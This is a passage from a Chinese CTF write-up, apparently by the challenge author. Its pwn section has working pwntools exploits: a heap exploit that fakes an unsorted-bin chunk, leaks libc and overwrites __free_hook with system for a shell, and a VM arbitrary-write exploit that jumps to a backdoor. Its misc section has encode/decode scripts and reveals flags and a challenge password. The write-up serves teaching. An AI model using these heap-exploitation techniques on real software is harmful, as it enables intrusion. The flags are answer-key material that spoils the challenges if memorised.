class="string">&quot;content:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sla(menu, <span class="built_in">str</span>(_free))</span><br><span class="line">    sla(<span class="string">&quot;index:&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sla(menu, <span class="built_in">str</span>(_show))</span><br><span class="line">    sla(<span class="string">&quot;index:&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">    sla(menu, <span class="built_in">str</span>(_edit))</span><br><span class="line">    sla(<span class="string">&quot;index:&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sa(<span class="string">&#x27;text:&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    add(<span class="number">0</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, (p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>)) * (<span class="number">0x60</span> / <span class="number">0x10</span>))</span><br><span class="line">    add(<span class="number">1</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">    add(<span class="number">2</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">    add(<span class="number">3</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">    add(<span class="number">4</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">    add(<span class="number">5</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">    add(<span class="number">6</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, (p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)) * (<span class="number">0x60</span> / <span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">6</span>):</span><br><span class="line">        free(i)</span><br><span class="line">    </span><br><span class="line">    show(<span class="number">5</span>)</span><br><span class="line">    ru(<span class="string">&#x27;text:&#x27;</span>)</span><br><span class="line">    heap = uu64(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>)[-<span class="number">6</span>:]) &amp; <span class="number">0xfffffffff000</span></span><br><span class="line">    echo(<span class="string">&#x27;HEAP BASE:&#x27;</span> + <span class="built_in">hex</span>(heap))</span><br><span class="line">    edit(<span class="number">3</span>, p64(heap + <span class="number">0x2c0</span> + <span class="number">0x50</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        add(<span class="number">7</span>, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    add(<span class="number">7</span>, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x60</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(<span class="number">0x10</span>) + p64(heap) +  p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>) + <span class="string">&#x27;a&#x27;</span> * <span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x431</span>))</span><br><span class="line"></span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    leak = uu64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]) - <span class="number">96</span> - <span class="number">0x10</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    echo(<span class="string">&#x27;LIBC BASE:&#x27;</span> + <span class="built_in">hex</span>(leak))</span><br><span class="line">    libc.address = leak</span><br><span class="line">    __free_hook = libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    system = libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    add(<span class="number">12</span>, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x30</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">13</span>, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x30</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    free(<span class="number">13</span>)</span><br><span class="line">    free(<span class="number">12</span>)</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">12</span>, p64(__free_hook))</span><br><span class="line">    add(<span class="number">13</span>, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x30</span>, <span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">    add(<span class="number">1</span>, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x30</span>, p64(system))</span><br><span class="line">    free(<span class="number">13</span>)</span><br><span class="line">    <span class="comment"># gdba()</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>
<h5 id="伪造ub详解"><a href="#伪造ub详解" class="headerlink" title="伪造ub详解"></a>伪造ub详解</h5><p>程序中还有个小漏洞，就是add的时候index可以由我们自己来指定，这样就造成了之前写过的在内存中的数据可能会被覆盖，所以极大增强了我们的体验，想怎么打都可以，考的点就是如何伪造出来一块ub，那么详细记录下</p>
<p>我是边做边给带🔥写的wp，首先写随便申请一通chunk，在chunk0中伪造一个假的header，日后可以覆盖chunk1的header</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>))</span><br><span class="line">add(<span class="number">1</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">4</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">5</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">6</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">6</span>):</span><br><span class="line">    free(i)</span><br></pre></td></tr></table></figure>
<p><img src="/Users/lemon/Library/Application%20Support/typora-user-images/image-20211002165852836.png" alt=""></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">show(<span class="number">5</span>)</span><br><span class="line">ru(<span class="string">&#x27;text:&#x27;</span>)</span><br><span class="line">heap = uu64(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>)[-<span class="number">6</span>:]) &amp; <span class="number">0xfffffffff000</span></span><br><span class="line">echo(<span class="string">&#x27;HEAP BASE:&#x27;</span> + <span class="built_in">hex</span>(heap))</span><br><span class="line">edit(<span class="number">3</span>, p64(heap + <span class="number">0x2b0</span>))</span><br></pre></td></tr></table></figure>
<p>泄露出堆地址后，改个fd为之前伪造的header</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv12qeb61bj612a04s3z702.jpg" alt=""></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    add(<span class="number">7</span>, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;b&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">7</span>, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x50</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x431</span>))</span><br></pre></td></tr></table></figure>
<p>全部申请回来，最终会申请到fake chunk，然后顺势把下一个chunk的header给🐑了</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv152umtcrj61b40awwgo02.jpg" alt=""></p>
<p>就像这个样，这样就有unsorted bin（下文记为ub）可以用了，但是free的时候还要伪造ub的下一个chunk的header要不然过不了check，手算一波偏移，大概在最底部的chunk附近，所以把之前的exp稍微改改，6号chunk的内容全改为合法的header，目前为止exp长这样：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>))</span><br><span class="line">add(<span class="number">1</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">4</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">5</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">6</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, (p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)) * (<span class="number">0x60</span> / <span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">6</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line">show(<span class="number">5</span>)</span><br><span class="line">ru(<span class="string">&#x27;text:&#x27;</span>)</span><br><span class="line">heap = uu64(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>)[-<span class="number">6</span>:]) &amp; <span class="number">0xfffffffff000</span></span><br><span class="line">echo(<span class="string">&#x27;HEAP BASE:&#x27;</span> + <span class="built_in">hex</span>(heap))</span><br><span class="line">edit(<span class="number">3</span>, p64(heap + <span class="number">0x2c0</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    add(<span class="number">7</span>, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">7</span>, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x50</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x431</span>))</span><br></pre></td></tr></table></figure>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv158sjq5uj61he0e6tbj02.jpg" alt=""></p>
<p>fake ub 伪造完成，下面就是leak出来libc的地址</p>
<p>尴尬，伪造好突然发现ub在文章的header部分，程序没有header部分的free功能，只能重新伪造了，思路是一样的</p>
<p><img src="/Users/lemon/Library/Application%20Support/typora-user-images/image-20211002192548895.png" alt=""></p>
<p>经过一点修改后将其伪造到了idx为1的位置，思路是一样的，现给出前面部分的exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, (p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>)) * (<span class="number">0x60</span> / <span class="number">0x10</span>))	<span class="comment"># 无脑伪造</span></span><br><span class="line">add(<span class="number">1</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">4</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">5</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">6</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, (p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)) * (<span class="number">0x60</span> / <span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">6</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line">show(<span class="number">5</span>)</span><br><span class="line">ru(<span class="string">&#x27;text:&#x27;</span>)</span><br><span class="line">heap = uu64(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>)[-<span class="number">6</span>:]) &amp; <span class="number">0xfffffffff000</span></span><br><span class="line">echo(<span class="string">&#x27;HEAP BASE:&#x27;</span> + <span class="built_in">hex</span>(heap))</span><br><span class="line">edit(<span class="number">3</span>, p64(heap + <span class="number">0x2c0</span> + <span class="number">0x50</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    add(<span class="number">7</span>, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">7</span>, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x60</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(<span class="number">0x10</span>) + p64(heap) +  p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>) + <span class="string">&#x27;a&#x27;</span> * <span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x431</span>)) <span class="comment"># 伪造ub，中间有个部分填写heap的原因是show的时候需要寻址，需要填写一个合法地址</span></span><br></pre></td></tr></table></figure>
<p>伪造出ub后面的就是白给flag了</p>
<h3 id="caculator"><a href="#caculator" class="headerlink" title="caculator"></a>caculator</h3><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><p>简简单单的VM pwn，估计是全网最简单的VM pwn了，提供了直接和程序模拟的寄存器的交互接口，漏洞位于一个任意地址写，bss上还有函数指针，main还调用了这个指针，程序还有后门，改指针为后门函数一把🔐</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&#x27;./caculator&#x27;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0x40</span>))</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0x400ba0</span>))</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0x48</span>))</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0x48</span>))</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0x38</span>))</span><br><span class="line">io.sendline(<span class="built_in">str</span>(-<span class="number">8</span>))</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0x50</span>))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<p>甚至可以不用pwntools直接nc上去getshell</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv1d2sklx1j30fu0akq30.jpg" alt=""></p>
<h4 id="详解"><a href="#详解" class="headerlink" title="详解"></a>详解</h4><p>静态编译，知道有人想🔨我了</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv1b77v9kfj61020nygnj02.jpg" alt=""></p>
<p>热知识，main在rdi寄存器里</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv1cuohlsrj60vk0bognn02.jpg" alt=""></p>
<p>四行代码，简简单单</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv1b9h2zqnj30xw0u0gqf.jpg" alt=""></p>
<p>第二个函数才是主要逻辑，一堆case，VM pwn没跑了</p>
<p>无论是经验，还是现搜，先确定一些系统函数：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/pengdonglin137/p/3345911.html">https://www.cnblogs.com/pengdonglin137/p/3345911.html</a></p>
<p>看到va，printf或者scanf系列的没跑了</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv1cwejlwyj30u00vqtdx.jpg" alt=""></p>
<p>不管是用程序的逻辑试还是逆向都很容易确定出来前四个case分别是加减乘除</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv1cyytjt3j617i0kk78d02.jpg" alt=""></p>
<p>case 0x48实现了pop操作，case 0x40实现了push操作，可以向栈上写入任意数据，通过pop可以控制我们自己实现的寄存器reg，并且case38可以实现向任意位置写入寄存器reg的操作，通过这一套操作实现了一个任意地址写</p>
<p>流程：push 后门函数地址，pop弹栈，pop弹栈（此时寄存器被赋值为后门的地址），利用任意地址写写到函数指针，退出执行getshell</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv1d0ev2asj60v207ujsh02.jpg" alt=""></p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv1d1kiasaj619o0k4tec02.jpg" alt=""></p>
<p>函数指针就在模拟的栈空间的上方，算下偏移很容易算出来是负8</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv1d3bty13j615g0o4wk602.jpg" alt=""></p>
<p>通过查看字符串可以找到后门</p>
<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="bbbbbbaaaaaasssssseeeeee"><a href="#bbbbbbaaaaaasssssseeeeee" class="headerlink" title="bbbbbbaaaaaasssssseeeeee"></a>bbbbbbaaaaaasssssseeeeee</h3><p>给了文本文件，一眼过去base编码，base解完发现是套了不同的base，写个脚本循环解密完事</p>
<p>出题脚本如下，我用的随机数，我也不知道啥套了啥，暴力破解就完了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encodeFlag</span>(<span class="params">i, flag</span>):</span></span><br><span class="line">    <span class="keyword">if</span>(i == <span class="number">0</span>):</span><br><span class="line">        flag = base64.b16encode(<span class="built_in">str</span>(flag).encode()).decode()</span><br><span class="line">    <span class="keyword">if</span>(i == <span class="number">1</span>):</span><br><span class="line">        flag = base64.b32encode(<span class="built_in">str</span>(flag).encode()).decode()</span><br><span class="line">    <span class="keyword">if</span>(i == <span class="number">2</span>):</span><br><span class="line">        flag = base64.b64encode(<span class="built_in">str</span>(flag).encode()).decode()</span><br><span class="line">    <span class="keyword">if</span>(i == <span class="number">3</span>):</span><br><span class="line">        flag = base64.b85encode(<span class="built_in">str</span>(flag).encode()).decode()</span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;flag&#123;Bas3_1s_s0_b3autifu1!&#125;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    flag = encodeFlag(random.randint(<span class="number">0</span>, <span class="number">3</span>), flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(flag.encode())</span><br></pre></td></tr></table></figure>
<p>解题脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    text = f.read()</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        text = base64.b16decode(text).decode()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            text = base64.b32decode(text).decode()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                text = base64.b64decode(text).decode()</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    text = base64.b85decode(text).decode()</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">print(text)</span><br></pre></td></tr></table></figure>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv4i8cfafqj60ca03st8z02.jpg" alt=""></p>
<h3 id="zzzzzziiiiiipppppp"><a href="#zzzzzziiiiiipppppp" class="headerlink" title="zzzzzziiiiiipppppp"></a>zzzzzziiiiiipppppp</h3><p>flag{D0nt_h1t_m3_N0_m0r3_01d_tr1ck5!}</p>
<p>灵感来源于ctf生涯中及其短暂的时间内任职过一个misc手而打过的比赛中的无脑套娃题——【MRCTF】千层套路，本题又降低了难度，因为当时解出来好像</p>
<p>给了压缩包，稍微试试就知道密码是文件名，但是压缩包很多，手解不可能，于是只能搓jio本</p>
<p>稍微查查就知道python有个库叫zipfile可以解，但是很慢，所以会写shell jio本的同学应该更容易抢到一血，但是👴🏻不会shell jio本所以👴🏻注定抢不了一血，因为👴🏻是出题人，跑偏了</p>
<p>现给出出题用的jio 本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">compressedFileToCreate</span>(<span class="params">random_number, prev_filename</span>):</span></span><br><span class="line">    print(<span class="string">&#x27;prev:&#x27;</span> + prev_filename)</span><br><span class="line">    filename = <span class="built_in">str</span>(random_number) + <span class="string">&#x27;.zip&#x27;</span></span><br><span class="line">    os.system(<span class="string">&quot;zip -P %s %s %s&quot;</span>%(<span class="built_in">str</span>(random_number), filename, prev_filename))</span><br><span class="line">    <span class="keyword">if</span> prev_filename[-<span class="number">4</span>:] == <span class="string">&#x27;.zip&#x27;</span>:</span><br><span class="line">        os.system(<span class="string">&#x27;rm &#x27;</span> + prev_filename)</span><br><span class="line">    <span class="keyword">return</span> filename</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">randomNumberGeneration</span>():</span></span><br><span class="line">    number = string.digits</span><br><span class="line">    random_list = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        index = random.randint(<span class="number">0</span>, <span class="number">9</span>)</span><br><span class="line">        random_list.append(number[index])</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(random_list)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">        number = randomNumberGeneration()</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">            prev_filename = compressedFileToCreate(number, <span class="string">&#x27;flag.txt&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            prev_filename = compressedFileToCreate(number, prev_filename)</span><br></pre></td></tr></table></figure>
<p>解题脚本很简单，就是得等一会儿，等到报错的时候，就还有一个文件没有解开，手动解就完了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>(<span class="params">filename, prev_filename</span>):</span></span><br><span class="line">    fz = zipfile.ZipFile(filename + <span class="string">&#x27;.zip&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    fz.extractall(pwd=<span class="built_in">bytes</span>(filename, <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    name = fz.filelist[<span class="number">0</span>].filename[<span class="number">0</span>:<span class="number">4</span>]</span><br><span class="line">    <span class="keyword">if</span> prev_filename:</span><br><span class="line">        os.system(<span class="string">&#x27;rm &#x27;</span> + prev_filename + <span class="string">&#x27;.zip&#x27;</span>)</span><br><span class="line">    fz.close()</span><br><span class="line">    <span class="keyword">return</span> filename,name</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    filename = <span class="string">&#x27;8366&#x27;</span>		<span class="comment"># 初始压缩包文件名</span></span><br><span class="line">    prev_filename = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        prev_filename,filename = exp(filename, prev_filename)</span><br></pre></td></tr></table></figure>
<h3 id="WaterMark"><a href="#WaterMark" class="headerlink" title="WaterMark"></a>WaterMark</h3><p>出题思路：图片盲水印，foremost 然后用盲水印脚本一把梭</p>
<p>flag{water_mark_is_so_fun}</p>
<h3 id="letter"><a href="#letter" class="headerlink" title="letter"></a>letter</h3><p>附件给了一个pdf</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv5q8fuo9aj61ec0rewjh02.jpg" alt=""></p>
<p>注意到后面有个nc地址，连上去发现需要输入username和password，但是不知道，pdf中有username和password，虽然挡住了，但是能够直接复制出来，得到username和password分别为lemon和l3m0n_l0v3_rgb，然后nc连上去输入用户名和密码</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv5qpl745kj614g0d2mzg02.jpg" alt=""></p>
<p>获得一个网址，我们用web端访问一下看看</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv5qtajoe8j60qk0jgq4i02.jpg" alt=""></p>
<p>有个文本文件，下载下来康康</p>
<p>部分内容：</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv5qttlz10j60d00ii0tz02.jpg" alt=""></p>
<p>结合刚才的密码，这个应该是个rgb图像的像素点，并且还给了宽和高，利用PIL库合成像素点获得flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">x = <span class="number">2012</span></span><br><span class="line">y = <span class="number">1014</span></span><br><span class="line"></span><br><span class="line">img = Image.new(<span class="string">&quot;RGB&quot;</span>,(x,y))</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./tmp.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:		<span class="comment"># 记得删掉前两行的宽和高方便数据处理</span></span><br><span class="line">    <span class="keyword">for</span> width <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,x):</span><br><span class="line">        <span class="keyword">for</span> height <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,y):</span><br><span class="line">            line = f.readline().strip(<span class="string">&#x27;\n&#x27;</span>)[<span class="number">1</span>:-<span class="number">1</span>]</span><br><span class="line">            rgb = line.split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">            img.putpixel((width,height),(<span class="built_in">int</span>(rgb[<span class="number">0</span>]),<span class="built_in">int</span>(rgb[<span class="number">1</span>]),<span class="built_in">int</span>(rgb[<span class="number">2</span>])))</span><br><span class="line"></span><br><span class="line">img.save(<span class="string">&#x27;flag.jpg&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv5qvelkd1j61dl0u00w002.jpg" alt=""></p>
<p>flag{l3m0n_10v3_pdf_and_rgb}</p>
